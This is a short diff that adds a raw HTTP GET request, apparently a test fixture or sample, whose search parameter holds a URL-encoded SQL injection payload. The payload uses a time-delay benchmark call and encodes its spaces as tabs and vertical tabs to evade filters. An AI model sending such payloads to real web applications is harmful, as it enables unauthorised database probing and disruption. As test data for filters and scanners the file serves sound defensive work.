@@ -1,0 +1,6 @@
+GET /api/data?search=%27%250bCHAR%28111%2C114%29%2509benchmark%281000000%2Cmd5%281%29%29--%3B%2509SELECT%250bNULL HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Accept: */*
+Connection: close
+
